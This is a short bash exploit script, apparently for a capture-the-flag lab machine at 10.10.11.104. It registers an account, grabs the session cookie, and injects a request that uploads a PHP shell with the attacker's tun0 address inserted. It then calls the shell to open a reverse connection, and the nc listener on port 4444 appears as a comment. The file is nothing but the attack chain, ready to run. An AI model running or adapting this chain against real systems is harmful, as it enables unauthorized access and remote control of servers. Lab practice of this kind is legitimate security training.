#set -m
my=$(ip a show dev tun0 | grep 'inet ' | awk -F '[/ ]+' '{print $3}')
curl -d '@req/create-user' 10.10.11.104/accounts.php 1>/dev/null 2>&1
cookie=$(curl -v -d 'username=tilli&password=123456' 10.10.11.104/login.php 2>&1 | grep 'Set\-Cookie' | awk '{print substr($3,11,26)}')
#nc -lvnp 4444 &
req_data=$(cat req/upload-shell|sed "s/xxx.xxx.xxx.xxx/$my/")
curl -d "$req_data" -H "Cookie: PHPSESSID=$cookie" 10.10.11.104/logs.php 1>/dev/null 2>&1
curl 10.10.11.104/r3.php
#fg %1
